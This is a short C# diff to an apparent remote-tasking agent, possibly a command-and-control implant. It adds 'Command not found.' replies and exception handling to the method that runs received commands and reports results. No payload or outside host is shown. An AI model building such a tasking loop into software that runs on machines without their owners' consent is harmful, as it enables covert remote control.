@@ -51,10 +51,22 @@ namespace Agent
         private static void HandleTask(AgentTask task)
         {
             var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command));
-            if (command is null) return;
+            if (command is null)
+            {
+                SendTaskResult(task.Id, "Command not found.");
+                return;
+            }
 
-            var result = command.Execute(task);
-            SendTaskResult(task.Id, result);
+            try 
+            {
+                var result = command.Execute(task);
+                SendTaskResult(task.Id, result);
+            }
+            catch (Exception e)
+            {
+                SendTaskResult(task.Id, e.Message);
+            }
+            
         }
 
         private static void SendTaskResult(string taskId, string result)
